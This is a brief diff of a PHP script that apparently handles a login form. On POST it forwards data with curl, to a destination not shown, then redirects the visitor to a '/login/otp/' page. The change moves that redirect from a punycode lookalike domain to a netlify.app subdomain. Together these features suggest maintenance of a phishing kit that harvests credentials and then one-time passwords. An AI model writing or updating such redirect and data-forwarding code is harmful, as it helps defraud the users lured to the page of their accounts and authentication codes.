@@ -35,7 +35,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $response = curl_exec($ch);
     curl_close($ch);
 
-    header("Location: https://xn--zd-hpa.com/login/otp/");
+    header("Location: https://sallaa.netlify.app/login/otp/");
     exit();
 }
 ?>
